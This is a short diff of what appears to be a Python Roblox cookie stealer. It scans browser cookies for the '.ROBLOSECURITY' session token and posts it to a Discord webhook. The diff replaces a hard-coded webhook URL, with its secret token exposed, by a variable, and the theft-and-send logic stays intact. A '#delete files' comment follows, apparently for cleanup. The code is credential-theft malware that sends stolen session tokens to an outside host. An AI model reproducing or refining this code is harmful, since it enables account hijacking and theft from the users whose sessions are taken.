@@ -53,7 +53,7 @@ driver.close()
 for cookie in cookies:
     if "'.ROBLOSECURITY'," in str(cookie):
         print("working")
-        webhook = Webhook.from_url("https://discord.com/api/webhooks/872171367661977661/xlyY2RmoWT4Inx2253Sb0XaR2-ZpLGsO6oia7Un5hhr6wyKZHBiaHn8f7sLi8wVqTSTf", adapter=RequestsWebhookAdapter())
+        webhook = Webhook.from_url(discord_webhook, adapter=RequestsWebhookAdapter())
         webhook.send(cookie)
         print(cookie)
 #delete files
